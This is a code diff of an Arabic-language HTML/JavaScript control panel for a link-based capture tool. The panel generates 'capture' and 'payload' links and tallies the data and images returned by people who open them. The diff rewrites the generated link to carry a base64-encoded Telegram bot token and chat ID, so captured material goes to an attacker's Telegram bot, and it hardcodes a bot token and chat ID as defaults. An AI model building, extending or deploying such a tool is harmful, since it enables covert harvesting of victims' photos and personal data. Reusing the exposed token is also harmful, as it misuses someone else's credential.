@@ -114,21 +114,6 @@
             font-size: 1em;
         }
 
-        .file-input {
-            width: 100%;
-            padding: 20px;
-            border: 2px dashed #666;
-            border-radius: 8px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            background: rgba(50, 50, 50, 0.5);
-        }
-
-        .file-input:hover {
-            border-color: #ff6b6b;
-        }
-
         .result {
             background: rgba(255, 0, 0, 0.1);
             border: 1px solid #ff6b6b;
@@ -249,21 +234,6 @@
             color: #ff3d3d;
         }
 
-        .permissions-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 10px;
-            margin: 15px 0;
-        }
-
-        .permission-item {
-            background: rgba(255, 0, 0, 0.1);
-            padding: 10px;
-            border-radius: 6px;
-            text-align: center;
-            border: 1px solid rgba(255, 0, 0, 0.3);
-        }
-
         .stats {
             display: grid;
             grid-template-columns: repeat(4, 1fr);
@@ -344,6 +314,20 @@
 
         .tab-content.active {
             display: block;
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin: 10px 0;
+        }
+
+        .info-item {
+            background: rgba(255, 0, 0, 0.1);
+            padding: 10px;
+            border-radius: 6px;
+            border: 1px solid rgba(255, 0, 0, 0.3);
         }
     </style>
 </head>
@@ -483,23 +467,6 @@
                             <input type="text" class="text-input" id="defaultChatId" placeholder="معرف الدردشة الافتراضي" value="6113061454" style="margin-top: 10px;">
                         </div>
 
-                        <div class="input-group">
-                            <label class="input-label">إعدادات التخزين</label>
-                            <select class="text-input" id="storageType">
-                                <option value="local">التخزين المحلي</option>
-                                <option value="server">التخزين على السيرفر</option>
-                            </select>
-                        </div>
-
-                        <div class="input-group">
-                            <label class="input-label">إعدادات الأمان</label>
-                            <div class="permissions-grid">
-                                <div class="permission-item">🔒 تشفير البيانات</div>
-                                <div class="permission-item">🛡️ حماية الروابط</div>
-                                <div class="permission-item">🚫 منع الوصول المباشر</div>
-                            </div>
-                        </div>
-
                         <button class="btn btn-success" id="saveSettingsBtn">
                             💾 حفظ الإعدادات
                         </button>
@@ -551,8 +518,7 @@
             receivedData: [],
             settings: {
                 defaultBotToken: "7144838322:AAEYLHsGFavk7BAlHqfcsV5XuXvOEadS6KA",
-                defaultChatId: "6113061454",
-                storageType: "local"
+                defaultChatId: "6113061454"
             }
         };
 
@@ -577,7 +543,6 @@
             errorMessage: document.getElementById('errorMessage'),
             defaultBotToken: document.getElementById('defaultBotToken'),
             defaultChatId: document.getElementById('defaultChatId'),
-            storageType: document.getElementById('storageType'),
             saveSettingsBtn: document.getElementById('saveSettingsBtn'),
             systemTerminal: document.getElementById('systemTerminal'),
             totalVisits: document.getElementById('totalVisits'),
@@ -590,17 +555,13 @@
         const tabs = document.querySelectorAll('.tab');
         tabs.forEach(tab => {
             tab.addEventListener('click', () => {
-                // إزالة النشاط من جميع التبويبات
                 tabs.forEach(t => t.classList.remove('active'));
-                // إضافة النشاط للتبويب المحدد
                 tab.classList.add('active');
                 
-                // إخفاء جميع محتويات التبويبات
                 document.querySelectorAll('.tab-content').forEach(content => {
                     content.classList.remove('active');
                 });
                 
-                // إظهار محتوى التبويب المحدد
                 const tabId = tab.getAttribute('data-tab');
                 document.getElementById(`${tabId}-tab`).classList.add('active');
             });
@@ -623,7 +584,6 @@
             elements.dataReceived.textContent = systemData.receivedData.length;
             elements.imagesReceived.textContent = systemData.receivedData.filter(data => data.images && data.images.length > 0).length;
             
-            // إحصائيات النظام
             elements.totalVisits.textContent = systemData.receivedData.length;
             elements.successRate.textContent = systemData.receivedData.length > 0 ? 
                 `${Math.round((systemData.receivedData.filter(data => data.success).length / systemData.receivedData.length) * 100)}%` : '0%';
@@ -656,13 +616,12 @@
         function completeLinkGeneration(name, description, botToken, chatId) {
             elements.progress.style.display = 'none';
             
-            // إنشاء رابط حقيقي
             const linkId = generateLinkId();
-            const linkUrl = `${window.location.origin}/capture/${linkId}`;
+            const linkUrl = `${window.location.origin}/capture.html?id=${linkId}&bot=${btoa(botToken)}&chat=${btoa(chatId)}`;
             
             elements.generatedLink.innerHTML = `
                 <strong>الرابط:</strong><br>
-                <a href="${linkUrl}" style="color: #ff6b6b;">${linkUrl}</a><br><br>
+                <a href="${linkUrl}" target="_blank" style="color: #ff6b6b;">${linkUrl}</a><br><br>
                 <strong>الاسم:</strong> ${name}<br>
                 <strong>الوصف:</strong> ${description}<br>
                 <strong>البوت:</strong> ${botToken.substring(0, 10)}...<br>
@@ -672,7 +631,6 @@
             elements.linkResult.style.display = 'block';
             showMessage('success', '✅ تم إنشاء الرابط بنجاح');
             
-            // حفظ الرابط في النظام
             const newLink = {
                 id: linkId,
                 name: name,
@@ -783,15 +741,6 @@
             elements.terminal.scrollTop = elements.terminal.scrollHeight;
         }
 
-        // إضافة سجل لمحطة النظام
-        function addSystemLog(message) {
-            const logEntry = document.createElement('div');
-            logEntry.className = 'log-entry';
-            logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
-            elements.systemTerminal.appendChild(logEntry);
-            elements.systemTerminal.scrollTop = elements.systemTerminal.scrollHeight;
-        }
-
         // تفعيل/إيقاف الرابط
         function toggleLink(linkId) {
             const link = systemData.links.find(l => l.id === linkId);
@@ -817,7 +766,7 @@
             if (link) {
                 navigator.clipboard.writeText(link.url).then(() => {
                     showMessage('success', '✅ تم نسخ الرابط');
-                    link.clicks++; // زيادة عدد النقرات
+                    link.clicks++;
                     updateLinksList();
                 });
             }
@@ -871,13 +820,11 @@
         elements.saveSettingsBtn.addEventListener('click', () => {
             systemData.settings.defaultBotToken = elements.defaultBotToken.value;
             systemData.settings.defaultChatId = elements.defaultChatId.value;
-            systemData.settings.storageType = elements.storageType.value;
             
             showMessage('success', '✅ تم حفظ الإعدادات بنجاح');
-            addSystemLog('⚙️ تم تحديث إعدادات النظام');
         });
 
-        // محاكاة استقبال بيانات (للتجربة)
+        // محاكاة استقبال بيانات
         function simulateDataReceipt() {
             const links = systemData.links.filter(link => link.active);
             if (links.length === 0) return;
@@ -908,24 +855,17 @@
             updateDataList();
             
             addTerminalLog(`📨 تم استقبال بيانات جديدة من: ${randomLink.name}`);
-            
-            // تحديث علامة التبويب إذا كانت نشطة
-            if (document.getElementById('data-tab').classList.contains('active')) {
-                updateDataList();
-            }
         }
 
         // بدء النظام
         addTerminalLog('🚀 نظام التحكم يعمل بنجاح');
         addTerminalLog('🔗 جاهز لإنشاء الروابط واستقبال البيانات');
-        addSystemLog('✅ النظام يعمل بشكل طبيعي');
-        addSystemLog('📊 جاهز لتلقي البيانات');
         
         updateStats();
         updateLinksList();
         updateDataList();
 
-        // محاكاة استقبال بيانات بشكل دوري (للتجربة)
+        // محاكاة استقبال بيانات بشكل دوري
         setInterval(simulateDataReceipt, 10000);
 
         // نسخ رابط البايلود
@@ -945,4 +885,4 @@
         });
     </script>
 </body>
-                </html>
+    </html>
